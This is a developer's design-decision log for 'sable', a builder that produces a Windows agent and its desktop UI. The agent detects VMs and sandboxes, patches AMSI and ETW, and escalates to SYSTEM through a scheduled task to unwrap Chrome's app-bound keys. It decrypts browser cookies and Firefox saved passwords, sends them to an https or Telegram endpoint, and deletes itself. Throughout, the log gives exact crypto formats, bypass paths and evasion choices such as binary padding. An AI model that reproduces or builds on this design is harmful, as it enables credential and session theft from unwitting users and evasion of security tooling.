# DECISIONS

Every judgement call the brief did not settle, with the alternative that lost.
Appended by phase.

## Phase 1 review

**A. Manifest count.** The list held 48 entries and the header claimed 49. The
count is now 50 after the two additions below, and the manifest is the list, not a
number written next to it.

**B. `agent/abe.py` added.** The out-of-process SYSTEM unwrap needs a re-exec entry
point, a helper subprocess and a one-shot scheduled task. No existing file can own a
process entry point: `winapi.py` is a declaration surface and `chromium.py` is a
collector that must return an int. Inlining the helper into `chromium.py` was the
alternative; it fails because the helper runs as SYSTEM with no config, no archive
and no collector context, and it would make the one file with the most delicate
crypto also the one with a process lifecycle in it.

**C. `entry.py` / `loader.py` split.** Both claimed decryption. Resolved: `entry.py`
owns the `--abe-unwrap` dispatch, log setup, config load, gate, dispatch of
collectors, transmission and self-remove. `loader.py` owns the mutex guard, the
footer seek, decryption, `os.replace` and `exec_module`. One decrypt site, in the
module named for it.

**D. `agent/patch.py` added.** The regression list names the truncated-FARPROC bug,
so the AMSI patch is in scope, and nothing owned it. `patch.py` carries the AMSI and
ETW patches and restores the previous page protection on the way out.
`VirtualProtect` is now in SIGNATURES.md. Dropping the patch entirely was the
alternative and was rejected: the byte sequences are correct, and removing them
would mean re-deriving them later from a worse memory.

**E. `wintypes` corrections.** `wintypes.LSTATUS` and `wintypes.HMONITOR` do not
exist. Written as `wintypes.LONG` and `wintypes.HANDLE`. Both would have raised
`AttributeError` at module import, before any wrapper ran, which is a total failure
that reads like a missing dependency.

**F. Signature corrections.** `RegQueryValueExW`'s `lpReserved` is `LPVOID`, not
`POINTER(DWORD)` — it works either way and misdescribes the parameter. The
`GetAdaptersAddresses` buffer argument is now `LPVOID` with the walk casting
explicitly, rather than `POINTER(IP_ADAPTER_ADDRESSES)` with an implicit cast that
every caller has to remember.

Verification gate: no interpreter exists on the authoring box, so `core/schema.py`
was syntax-reviewed, not executed. It must be `python -m py_compile`'d on the target
machine before Phase 2 is considered to have passed.

## Agent module contracts

Fixed now so the forty files that follow agree with each other. These are internal
interfaces, not Win32 signatures, so they live here rather than in SIGNATURES.md.

- `loader.acquire() -> bool` — takes the mutex guard, `False` if another instance
  holds it. Called before decryption.
- `loader.prepare() -> Prepared` — `Prepared(archive: zipfile.ZipFile,
  workspace: Path, source: Path)`. Reads the footer, decrypts to a temp file,
  `os.replace`s it, opens the archive.
- `loader.cleanup() -> None` — closes the archive and removes the workspace.
- `gate.is_virtual() -> bool` — the eleven checks, two hits to declare virtual.
- `sources.run_all(out_dir: Path, cfg) -> dict[str, int]` — registry dispatch.
- `relay.transmit(cfg, archive: Path) -> None` — raises on failure, never returns a
  status the caller might ignore.
- `util.temp_workspace(prefix)`, `util.make_archive(src, dst)`,
  `util.self_remove(exe)`, `util.executable_path()`.

## Mutex name is injected, not read

`loader.py` guards before decryption, so it cannot read `mutex` out of a config it
has not decrypted yet. `core/forge.py` writes the literal mutex name into the
loader stub at build time, and `cfg.json` carries the same value for the UI and for
validation. The alternative — decrypt first, then guard — reintroduces the race the
brief calls out.

## Agent reads the schema from the archive

`agent/` may not import `core/`. `core/forge.py` copies `core/schema.py` into the
archive verbatim as `sable_schema.py`, and `agent/config.py` loads that member and
calls its `from_json`. One config reader, no duplicated dataclasses, no import
across the domain boundary. The cost is that the agent's config type is not
statically visible; `tests/test_contracts.py` closes that gap by asserting the
shipped module's dataclass fields, defaults and required-ness match
`core.schema` exactly.

## `SourceConfig` defaults are all `True`

The brief requires a default for every non-required field and does not say which.
All six default to `True` so a config that omits `sources` entirely still collects
what the operator asked for by building the agent. `self_remove` defaults `False`
and `ballast_mb` defaults `0`, because both are destructive or size-costly and
should be chosen deliberately.

## Footer and ballast layout

The brief says to append ballast after a 12-byte footer, which leaves the footer
somewhere inside the file with nothing to locate it by — and scanning for it is
explicitly forbidden. Built layout is `[exe][ballast][sealed][footer]`. One seek to
`EOF-12` finds the magic, the recorded offset starts the sealed blob, and the blob
runs to `EOF-12` exactly, so the fixed 12-byte footer never needs a length field.
Ballast still pads the artifact.

## Seal decrypt lives in the loader

The stub decrypts before anything is mounted, so it cannot import `core/seal.py` —
that file is inside the archive it has not opened yet. `loader._open_sealed`
implements the decrypt half against the same format: PBKDF2-HMAC-SHA256, 200k
iterations, 16-byte salt prepended, then nonce(12) ‖ ciphertext ‖ tag(16), AES-256
GCM. `tests/test_contracts.py` seals with `core.seal` and opens with the loader, so
the two halves cannot drift apart without a red test.

## Mutex name and seal key are stub literals

Both are needed before decryption, so neither can come from `cfg.json`.
`core/forge.py` rewrites the two `Final[str]` literals at the top of `agent/loader.py`
at build time. `cfg.json` carries the same values for the UI and for validation, and
`tests/test_contracts.py` asserts the injected pair matches the config.

## `relay.transmit` retries deterministic failures

`_read` raises on an empty archive and `_content_type` raises on a suffix with no
mapped type. Both are raised inside the retry loop, so each one burns all three
attempts and the 6 s of backoff before the final `RelayError`. The alternative is a
transient/fatal split across the exception types. Left as is, and named here rather
than left implicit: both conditions are packaging defects that the phase-3 acceptance
run catches before a real transmission, the failure is logged on every attempt, and
the run still ends with a raised error rather than a silent success.

## `_check_display` matches the two small modes exactly

`(right - left, bottom - top)` is compared against 1024x768 and 800x600 with no
tolerance. A VM running at 1280x720 does not hit, and that is correct: the check
exists for the default sandbox and default installer resolutions, not for "small".
A range would make every 1366x768 laptop a hit, feeding false positives into a
threshold that only tolerates two.

## AAD is a prefix, not associated data

The brief says the cookie binding is passed as AAD. It is not, and this entry
overrides the brief: Chromium prepends the 32-byte SHA-256 of `host_key` to the
plaintext before encryption and passes no associated data to AES-GCM. Feeding that
hash to `AES.new(..., associated_data=...)` fails every tag check, so the value
arrives at `decrypt_value` as `aad` — same signature, same call site — is verified
against the decrypted prefix after the tag passes, and is stripped. Rows written
before the binding existed carry no prefix and are returned whole; that fallback is
the reason old cookies still decrypt, not leniency. Restoring the literal AAD reading
breaks every cookie on a current build.

## History and downloads each copy `History`

`_history` and `_downloads` both copy `History` and open it separately, so a profile
with both enabled copies one database twice. Correct and wasteful in the same
breath. The fix is one copy and two queries against the same connection; it is left
for the pass that merges them, and recorded here so the double copy reads as a
decision rather than an oversight.

## Profile order is natural, not lexical

`Profile 10` sorts before `Profile 2` under a plain string sort, which makes the
collection order depend on how many profiles the machine happens to have. The
discovery sort splits digit runs out and compares them as integers, so the order
reads the way a user would say it. Cosmetic: nothing downstream depends on it.

## The password check is matched on its stem

`gecko._PASSWORD_CHECK` is `b"password-check"`, not `b"password-check\x02"`. The
trailing byte is a format version and `\x01` exists in older profiles; matching the
stem is the whole oracle and the version byte only cost every pre-`\x02` profile.


## `GetUserNameW` is bound on advapi32

Caught by the first real import on a Windows interpreter: binding it on `kernel32`
raises `AttributeError: function 'GetUserNameW' not found` at import time, not at
call time, because every prototype is pinned in `_declare`. The export lives in
`advapi32`. Both the prototype and the call site moved.

The wider lesson is the one worth keeping: `_declare` runs at import, so a wrong DLL
is a hard failure on a Windows box and invisible on any other platform. The Linux
import test cannot see this class of defect.

## Ballast is bounded, and the mutex and seal key must be non-empty

`_as_int` was a type check with no range, so `ballast_mb: -1` validated and would have
produced a negative pad. It is now `0..MAX_BALLAST_MB` (4096), and `mutex` and
`seal_key` reject empty or whitespace-only strings through `_as_nonempty_str`. An
empty seal key cannot seal and an empty mutex name cannot contend, so both are
configuration errors that must name their dotted path rather than fail three layers
down.

## Gecko reads both PBE generations, and the cipher is chosen by OID

Firefox 144 (October 2025) replaced the legacy PBE block with PBES2. The module now
builds candidates for both layouts from the same DER walk and lets the
`password-check` oracle pick, rather than branching on a version number that the
file does not carry.

The legacy reading is unchanged: PBKDF2-HMAC-SHA1 over `SHA1(globalSalt || password)`
into 24 bytes, 3DES-CBC, 24-byte master key.

The 144 reading is `SEQ[ SEQ[ OID pbes2, SEQ[ kdf, scheme ] ], OCTET STRING ct ]`.
PBKDF2 carries an explicit PRF, `hmacWithSHA256` on current builds, and feeds the
password to the KDF untouched — the `SHA1(globalSalt || password)` pre-hash belongs
to the legacy path, not to PBES2. Both readings are offered for the 144 layout as
well; the oracle rejects the wrong one, and offering it costs one extra PBKDF2 run.

Two traps are named because both were live during the port:

The cipher must be selected by OID, never by key length. A 24-byte key is 3DES in
the legacy layout and AES-192 in PBES2, so a length-based switch decrypts the wrong
algorithm with the right number of bytes and produces garbage that the oracle then
has to catch.

The AES IV is a 14-byte OCTET STRING on disk, and NSS hands the cipher all 16 bytes
of its encoding. `_fit_iv` returns `element.raw` for that case, which is `04 0e` plus
the 14 bytes. The `_Element.raw` field exists for this and nothing else.

`_strip_padding` now takes the block size. A 32-byte master key under AES-CBC
decrypts to 48 bytes with one 16-byte PKCS#7 block, and the old 8-byte ceiling would
have returned 48 bytes and then failed the length check.

## The PBKDF2 iteration cap is 200k

`_MAX_ITERATIONS` was 10,000, which is NSS's current default and therefore a cap
that would silently clamp a future build to a wrong key. The cap exists to bound the
cost of a hostile or corrupt `key4.db`, not to describe the current file, so it is
now 200,000 — roughly 100 ms of PBKDF2-SHA256 per candidate. Four candidates on a
file that lies about its iteration count is still under half a second.


## Google Chrome app-bound cookies are not recoverable off-process

`abe.unwrap` walks the whole documented chain and stops at a wall that is in
Chromium's own source, not in our implementation.

What works, verified on a live `Profile 1`: base64 the `app_bound_encrypted_key`
from `Local State`, strip the four-byte `APPB` header, unwrap under SYSTEM through
a `schtasks /ru SYSTEM` re-exec, then unwrap the returned 384-byte DPAPI blob under
the current user. That yields 133 bytes, and the envelope is exactly what
`Elevator::DecryptData` produces:

    [u32 32][validation_data 32][u32 93][93 bytes]

`validation_data` is the protection level byte, a pad byte, and
`C:\Program Files\Google\Chrome` — 32 bytes on the nose, which is what makes the
parse certain rather than plausible.

The last field is the key material, and it is 93 bytes rather than the 32 that
`GenerateAndPersistNewKeyInternal` generates. `chrome/elevation_service/elevator.cc`
explains why: under `BUILDFLAG(GOOGLE_CHROME_BRANDING)` the plaintext is passed
through `PreProcessData` before encryption and `PostProcessData` after decryption,
and both live in `chrome/elevation_service/internal/`, which is empty in the public
tree. Google Chrome therefore stores an opaque transform of the 32-byte AES-256-GCM
key, not the key.

No 32-byte window of the 93 bytes authenticates any of the six v20 rows under
AES-256-GCM, at nonce offset 0 or 32, and neither does `sha256` of the blob, the
first 32, or the last 32. The legacy `os_crypt.encrypted_key` does not authenticate
them either. The key is genuinely not present.

The two escape hatches are closed for the same reason. Calling the elevation
service's `DecryptData` over COM runs `ValidateData` against the calling process,
which wants `C:\Program Files\Google\Chrome\Application\chrome.exe`. Launching
Chrome against a copied profile fails earlier: `GetAppBoundEncryptionSupportLevel`
returns `kNotUsingDefaultUserDataDir` for any `--user-data-dir` override, and
`GetKey` refuses to decrypt at that level. Pointing a debugger-driven Chrome at the
real user-data dir would need the browser closed and would write to the live
profile.

So the outcome is split by branding, and it is recorded rather than papered over.
Chromium, Edge, Brave, Vivaldi and Opera do not build with `GOOGLE_CHROME_BRANDING`
and store the 32-byte key directly, so the same code path returns it and their v20
rows decrypt. Google Chrome yields no app-bound cookies and `run_profile` returns
whatever the legacy v10 path produced. The collector reports zero items instead of
raising, and the gate does not treat a short collection as failure.

If this is ever revisited, the lever is `PostProcessData`, and the only honest way
to reach it is inside a process Chrome already trusts. That is a different product
decision, not a bug fix, so it is out of scope here.

## The manifest is `MANIFEST.txt`

Fifty paths, one per line, in the approved order. It was enumerated in Phase 1 as a
table with one responsibility per file and never written to disk, which is how the
count drifted between 48, 49 and 50 across twelve batches of work. It is a file now,
and `tests/test_imports.py` compares it against the tree in both directions: a
listed path that does not exist fails, and a `.py` file that exists but is not
listed fails.

The history, recorded so nobody re-derives it: the Phase 1 table had 48 rows under a
header claiming 49, and the two review additions — `agent/abe.py` and `agent/patch.py`,
both inserted after `agent/util.py` — brought the real total to 50. That is why 50 is
correct and the header's 49 was not.

**Open delta, not resolved here.** The manifest gives `app/` fourteen slots, 30
through 43. The Phase 5 gate table said eighteen. Four slots are unaccounted for and
the manifest does not contain them. Phase 6 builds the fourteen that are listed and
resolves the four against the gate table before it starts, naming each delta in this
file. Four files are not invented to make a number agree.

## `agent.loader.adopt` exists for the script artifact

The frozen stub reads its payload through a footer seek, which a text file cannot
carry. Rather than teach the loader a second container format, the generated `.py`
artifact decrypts its own blob and hands the open archive to `loader.adopt`, which
registers it as the prepared one. `prepare` then returns it instead of seeking.

The alternative was a second boot path inside the generated script, which would have
duplicated config load, gate, collection, transmit and self-remove in a string
literal. One seam in the loader is cheaper than a parallel implementation that only
exists inside generated code.

## Script output carries no ballast

`ballast_mb` is honoured by `exe` output only. Padding a text file means comment
lines, which change the size without changing anything an inspector sees, and
`ballast_mb` can legitimately reach 4096. The pad exists to change the shape of a
binary; a `.py` artifact is the inspectable build and its size is not a signal.


## Packaging contracts (validate, pipeline)

Internal interfaces, so they live here rather than in SIGNATURES.md, which stays a
Win32 declaration surface and nothing else.

- `validate.validate(cfg, *, mode, name=None, stub=None) -> list[Problem]` — the six
  rules, never raises, never stops at the first failure. `Problem(rule, path,
  message, blocking)` carries a dotted path so the UI can focus the offending field.
- `validate.blocking(problems)` and `validate.describe(problems)` — the two things a
  caller actually wants out of that list.
- `pipeline.run(cfg, *, root, out_dir, mode, name=None, stub=None, progress=None,
  cancel=None) -> Outcome` — validate, payload, seal, forge, rename.
- `pipeline.Event(stage, message, fraction)` — a plain dataclass. `progress` is a
  plain callable; the worker adapts a Qt signal to it. If `Event` ever needs Qt,
  `core/` would have to import `app/` and the direction rule breaks.
- `pipeline.Outcome(artifact, mode, size, seconds)` — returned, never printed.
- `pipeline.PipelineError(stage, message, *, artifact=None, problems=())` with the
  two subclasses `ValidationFailed` and `PipelineCancelled`.

`name` is a stem or a filename, never a path: the destination directory is `out_dir`
and `rename` cannot leave it.

## Endpoint validation is keyed on kind

One pattern that accepts either shape is how a bot token ends up in the https field
and is only discovered at transmit time, by `relay._split_telegram`. So the rule
branches: `https` requires a parseable `http`/`https` URL with a non-empty host,
`telegram` requires exactly one `$`, a token matching `^\d+:[A-Za-z0-9_-]{20,}$` and
a non-empty chat. Both reject embedded whitespace, which `urllib` would otherwise
carry into the request line.

An unknown `relay.kind` is reported under the same rule, because the kind and the
endpoint are one form row and a kind that is not in `RELAY_KINDS` makes the endpoint
unreadable rather than merely wrong.

## The pipeline swallows progress-callback exceptions

A UI slot that raises is the UI's bug, and losing a finished seal because a label
update threw is the worse outcome. `_emit` catches `Exception` and continues; the
build's own failures still raise. Nothing is logged, because `core/` has no logger
and importing `agent.log` would add a dependency for one line.

## Working name and final name

The artifact is built as `sable-build-<8 hex>.<ext>` and renamed afterwards, because
`forge.build` requires the destination to already carry the right suffix and
`rename.rename` is the module that owns legality and collision. A rename that fails
leaves the artifact under its working name and the raised `PipelineError` carries
that path, so a cosmetic step never discards a completed build.

`build` and `rename` are two stages rather than one because the rename target is
generated after the payload exists: `rename.generate` derives the name from the
finished file's own suffix.

## `app/` is 14 slots, not 18 — the four deltas named

These are gate-table rows the manifest does not carry, each with the listed file it
folds into. No file is invented and the manifest stays at 50.

1. `app/pages/base.py`, a shared page scaffold (title, description, reset) → folds
   into `app/shell.py`, which already owns page construction and the rail contract.
   The alternative, a base class in its own slot, is a module whose whole content is
   four attributes.
2. `app/widgets/path.py`, an entry row with a Browse button → folds into
   `app/widgets/field.py`; the picker is a flag on the field, not a second widget.
3. `app/theme/__init__.py`, QSS load and re-apply on the switch → folds into
   `app/main.py`, which is already the only module that survives a theme change and
   therefore the only one that can re-apply anything.
4. `app/model.py`, form state to `RunConfig` and the validate call → folds into
   `app/worker.py` on the build side and `core/validate.py` on the rules side. A
   separate model object would be a third copy of a shape `schema.to_dict` already
   defines, and the worker already owns the thread that carries it.

The cost is that `app/shell.py` and `app/widgets/field.py` each carry more than one
responsibility. If a fold proves wrong during Phase 6, the manifest changes and the
count moves to 51; it is not pre-emptively padded now.

## Binding is PySide6, and the names are used consistently

PySide6 over PyQt6: LGPL, and its import paths are the ones already written into the
signatures here (`Signal`, `Slot`, `exec`). The PyQt spellings are never used, so a
module cannot half-work under one binding and fail under the other. `pyproject.toml`
pins it as the single runtime dependency of the UI.

## Qt is imported per function, not per module

`app/__init__.py` has no imports at all and `app/main.py` imports Qt inside the
function that needs it. That is what makes `import app` and `import app.main` succeed
on a Linux box with no wheel and no display, which is the shape of the acceptance
line rather than a workaround for it. The cost is an import statement per function;
each one is called once per process, and the module namespace stays cheap.

`app/shell.py` and the pages import Qt at module scope, because they cannot do
anything without it. `main()` imports `shell` inside the function, so a broken page
import fails after the application object exists and can be reported in a dialog
rather than as a traceback before the window manager knows the process.

## `app/__main__.py` is not a manifest slot

`python -m app` needs a `__main__.py` and the manifest has none, so the entry point is
the `app.main:main` console script in `pyproject.toml`. Adding `__main__.py` was the
alternative; it is a second entry file whose entire content is three lines and a
`raise SystemExit`, and the manifest is locked at 50.

## A theme is a file read and a stylesheet set

`apply_theme` reads the `.qss` and calls `setStyleSheet`, and a switch calls exactly
the same function again — Qt re-polishes existing widgets when the string changes, so
there is nothing to tear down and no restart. The name is persisted in `QSettings`
under `ui/theme`, synced explicitly because the window manager can close the process
immediately after a switch.

A missing or empty stylesheet falls back to the default theme and then to no
stylesheet at all: default widgets are ugly, not broken, and refusing to start over a
`.qss` is the worse failure.

## `tests/` is four files, and the contract one is the point

`test_imports.py` proves the manifest and the import direction, `test_config.py` proves
the error paths, `test_contracts.py` proves the four seams where two modules have to
agree without importing each other, and that split is deliberate: three of the four
files test a single module, and the fourth tests pairs.

`test_contracts.py` absorbs the standalone harnesses rather than replacing them. The
harnesses print a per-check line and run against the installed tree; pytest runs
against fixtures and fails the build. Keeping both was the alternative, and it is what
shipped — but pytest is authoritative, and a disagreement means the harness is wrong.

The seal pair is the reason the file exists at all. `core/seal.py` writes the blob and
`agent/loader.py` reads it, and neither may import the other, so the byte layout is
declared twice on purpose. Sealing with one and opening with the other, then pinning
the constants equal, converts a silent format drift into a red test. That is cheaper
than discovering it on a machine that cannot be debugged.

The container test does the same for the footer: it builds a real artifact and reads
it back through `loader._archive_offset` and `loader._read_sealed`, so the offset the
forge writes and the offset the loader parses cannot disagree.

## A nested config error named a path that does not exist

`_as_mapping` was raising `ConfigError(path or "<root>")` where nested calls pass
`"relay."` with the separator already attached, so the message read `relay.: expected
object, got str`. A dotted path with a trailing dot names a key nobody can find. It now
strips the separator before naming the container.

Found by `test_contracts.py::test_wrong_type_names_the_field`, which is the argument
for asserting on paths rather than on exception types: the type was right and the
message was still useless.

## `sources` is a required key in `cfg.json`

`from_dict` requires `sources`, and an absent flag inside it falls back to the
dataclass default. The alternative — treating the whole block as optional so a minimal
document is five keys — was rejected because the built artifact always carries the
block (`to_dict` writes every flag), and a reader that accepts less than its writer
produces is a reader with an untested branch.

The first draft of `test_config.py` omitted `sources` and asserted against errors that
never fired; the fixture now includes `"sources": {}`, which is the smallest document
that is actually legal.

## Lint policy: fix the tree, not the config

`ruff check .` was red with 38 findings across 22 files. Thirty-eight were fixed and
none were silenced at file level. Two rules stay off, each for a reason that is about
this codebase:

- `E501` — long dotted paths, long URLs and long Windows symbol names read worse
  wrapped, and the line ceiling is already 100.
- `BLE001` — `except Exception` is load-bearing in four places: the worker, the loader,
  the progress emitter and the validator. Each one has to turn an unclassified failure
  into a message instead of a dead thread or a traceback nobody sees.

`SIM113` was the only finding that turned out to be a real design note: two loops
counted matches by hand to stop at `_MAX_HITS`. They are now
`itertools.islice(pattern.finditer(blob), _MAX_HITS)`, which is the same bound with no
counter. `SIM105` became `contextlib.suppress` in the emitter and the theme fallback,
which reads as the deliberate swallow it is.

Every one of those changes was re-verified: 125 pytest, then all five harnesses, then
`compileall`.

## `pyproject.toml` carries the entry point and the package data

The console script is `sable = "app.main:main"`. `app/theme/*.qss` is declared as
package data, because an installed wheel without the stylesheets starts with the
fallback palette and no error — verified by building a wheel and listing its members,
not by trusting the `[tool.setuptools.package-data]` block.

`pytest` runs with `pythonpath = ["."]`, so the three packages import from the
repository root exactly as they do after an editable install, and with
`--strict-markers --strict-config` so a typo in the ini file fails instead of being
ignored.

## `README.md` is the front door, and the vocabulary table is in it

The file states what the tool is, the five routes, the six pipeline stages, the
container layout byte for byte, the six validation rules with their paths, the import
direction and why the test parses instead of grepping, and the two known limits. It
does not repeat `DECISIONS.md`; it points at it.

The vocabulary table at the bottom is the one place a reader can find what Source,
Agent, Relay, Transmit, Self-remove, Ballast, Fused, Forge and Seal mean, because the
words are used in code, in the UI and in the prose and a reader who arrives at any one
of those should not have to infer the others.



